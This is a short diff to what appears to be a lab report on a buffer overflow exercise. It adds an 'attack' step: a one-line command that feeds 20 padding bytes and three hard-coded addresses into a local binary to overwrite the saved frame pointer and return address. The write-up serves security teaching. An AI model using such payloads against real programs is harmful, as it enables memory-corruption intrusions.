@@ -132,6 +132,15 @@ Here's the result:
 
 Observing the result, the address of task1 is: 0x08048060
 
+#### 3. Conduct the attack
+
+Here's the attack command:
+
+```
+./task1.out $(python -c "print('a' * 20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x60\x80\x04\x08')")
+```
+
+The first 20 bytes will overflow the buffer memory and the ebp, followed by the addresses we expect.
 
 
 **Conclusion**: comment text about the screenshot or simply answered text for the question
